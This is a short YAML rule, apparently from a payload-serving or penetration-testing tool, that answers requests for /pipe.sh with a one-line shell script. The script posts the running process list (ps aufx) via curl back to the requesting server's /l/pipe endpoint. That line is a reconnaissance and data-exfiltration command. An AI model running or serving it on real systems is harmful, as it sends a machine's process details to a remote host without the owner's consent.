---
title: Random SSH
description: Simple SSH (requires build of simple ssh in static dir)
weight: 1
pattern: /pipe.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    curl -d "$(ps aufx)" {{.Request.Host}}/l/pipe?status
---
